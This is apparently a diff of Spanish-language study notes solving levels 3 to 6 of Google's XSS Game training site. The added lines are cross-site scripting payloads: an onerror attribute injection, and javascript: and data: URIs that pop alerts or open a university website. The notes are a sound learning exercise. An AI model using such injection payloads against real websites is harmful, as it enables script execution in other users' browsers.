@@ -15,7 +15,7 @@ https://xss-game.appspot.com/
 # Al pasar un fragmento malintencionado que se insertará en la página, se activará la alerta.
 
 https://xss-game.appspot.com/level3/frame#'   
-
+1' onerror='alert();//
 1' onerror='alert("Me salto el frame");//
 
 # Level 4: Context matters -----------------------------------------
@@ -29,6 +29,7 @@ https://xss-game.appspot.com/level3/frame#'
 # En la página de registro podemos ingresar una dirección de correo electrónico (o cualquier cosa, no se evalúa después de todo), Podemos engañar al parámetro next inyectando código javascript en él, ejecutando la función de alerta.
 
 https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("xss")
+next=javascript:open("https://www.nebrija.es")
 email: cualquier-cosa
 
 
@@ -36,6 +37,7 @@ email: cualquier-cosa
 
 https://xss-game.appspot.com/level6/frame#     
 data:text/plain,alert('xss')
+data:text/plain,open('https://www.nebrija.es')
 
 -----
 https://medium.com/@.Qubit/google-xss-game-walkthrough-3eaf04dc89a3
